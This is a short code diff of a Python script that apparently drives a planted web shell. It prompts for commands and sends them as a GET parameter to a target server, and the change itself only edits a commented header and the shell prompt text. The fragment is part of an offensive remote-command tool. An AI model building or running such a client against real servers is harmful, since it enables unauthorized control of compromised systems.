@@ -9,7 +9,6 @@ urllib3.disable_warnings()
 # 构建get默认请求头
 def default_headers():
     headers = {
-        # "Host": f"{host}",
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
         "Accept": "*/*",
         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
@@ -31,7 +30,7 @@ def simple_horse_get_con(address, param):
         sys.exit(0)
     while True:
         req = requests.Session()
-        shell = input(f"[{param} Shell]: ")
+        shell = input(f"[Web-Shell {param}]: ")
         if shell == 'exit':
             break
         params = {param: f"{shell}"}
